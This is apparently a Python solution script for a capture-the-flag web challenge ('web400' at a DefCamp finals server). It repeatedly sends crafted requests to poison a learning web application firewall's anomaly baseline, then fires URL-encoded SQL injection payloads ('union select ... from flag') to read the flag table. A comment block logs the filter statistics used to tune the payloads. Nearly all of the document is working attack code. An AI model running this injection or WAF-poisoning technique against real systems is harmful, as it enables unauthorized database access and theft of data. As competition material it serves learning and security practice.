#!/usr/bin/python
import time, requests

url       = 'https://web400.dctf-finals16.def.camp/'
reset_waf = url + 'index.php?reset_waf'
task      = url + 'vuln.php?id='

s = requests.session()
def get(link, times = 1):
	c = ""
	for i in range(times):
		print link
		c += s.get(link).text
		time.sleep(.1)

	return c

get(reset_waf, 1)
get(task + '3', 1)
get(task + '3a', 1)
get(task + '"3a', 4)
get(task + '"33aa*', 5)
get(task + '"3333aaaa***', 6)
get(task + '"33333333aaaaaaaa*******', 2)
get(task + '"3333aaaaaaaaaaaa*******', 1)
get(task + '"333aaaaaaaaaaaaa*******', 2)
get(task + '"3aaaaaaaaaaaaaaa*******', 5)
'''
when you get here you've bypassed the GET request filter but you get blocked into content anomaly filter:

{"totallen":153,"alpha":114.1,"alphanums":115.1,"nums":1.1,"special":38,"ascii":153,"nonascii":0.1}
Flag has:
Array
(
    [totallen] => 39 OK
    [alpha] => 17 OK
    [alphanums] => 36 OK
    [nums] => 19 NUP
    [special] => 3 NUP
    [ascii] => 39 OK
    [nonascii] => 0 OK
)
{"totallen":169.4,"alpha":127.5,"alphanums":130.4,"nums":3,"special":39,"ascii":169.4,"nonascii":0.1}
'''

get(task + '"%20union%20select%200,repeat(value,%202)%20from%20flag--%20-', 5)
get(task + '"%20union%20select%200,repeat(value,%201)%20from%20flag--%20-', 5)
#{"totallen":47,"alpha":30,"alphanums":32,"nums":2,"special":15,"ascii":47,"nonascii":0}
get(task + '"%20union%20select%200,"aaaaaaaaaaaaaaaaa0000aaaa*******aaaaaaa"%20from%20flag--%20-',5)
get(task + '"%20union%20select%200,"aaaaaaaaaaaaaaaaa00000000*******aaaaaaa"%20from%20flag--%20-',3)
#{"totallen":39.1,"alpha":24.5,"alphanums":32.1,"nums":7.5,"special":2.1,"ascii":39.1,"nonascii":0.1}
get(task + '"%20union%20select%200,"aaaaaaaaaaaaa000000000000*******aaaaaaa"%20from%20flag--%20-',3)
print get(task + '"%20union%20select%200,value%20from%20flag--%20-', 5)
